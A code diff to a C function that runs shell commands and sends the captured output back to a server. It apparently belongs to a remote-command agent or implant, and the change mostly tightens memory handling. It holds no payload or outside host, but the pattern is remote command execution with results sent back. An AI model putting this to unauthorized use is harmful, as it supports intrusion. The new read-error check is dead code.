@@ -108,21 +108,45 @@ void cmd_shell(request_t *req, int sockfd, const profile_t *profile, const char 
         size_t total_size = 0;
         char read_chunk[4096];
         ssize_t bytes_read;
+        char *temp_ptr = NULL;
 
         while ((bytes_read = read(pipefd[0], read_chunk, sizeof(read_chunk))) > 0) {
-            output_buffer = realloc(output_buffer, total_size + bytes_read);
-
-            if (output_buffer == NULL) {
-                // Handle memory allocation error
-                perror("realloc failed");
-                break; 
+            if (bytes_read < 0) { // Handle read error
+                perror("read failed");
+                free(output_buffer);
+                output_buffer = NULL;
+                break;
             }
 
+            temp_ptr = realloc(output_buffer, total_size + bytes_read + 1);
+
+            if (temp_ptr == NULL) {
+                // perror("realloc failed");
+                free(output_buffer);
+                return;
+            }
+
+            // Save data to output_buffer
+            output_buffer = temp_ptr; 
             memcpy(output_buffer + total_size, read_chunk, bytes_read);
             total_size += bytes_read;
         }
-        send2serv(req, profile, output_buffer, total_size);
-        free(output_buffer);
+
+        // Null terminate
+        if (output_buffer == NULL && total_size == 0) {
+            output_buffer = calloc(1, 1);
+            if (output_buffer == NULL) {
+                perror("calloc failed");
+                return;
+            }
+        } else if (output_buffer != NULL) {
+            output_buffer[total_size] = '\0';
+        }
+        
+        if (output_buffer) {
+            send2serv(req, profile, output_buffer, total_size);
+            free(output_buffer);
+        }
     }
     free(args);
     close(pipefd[0]);
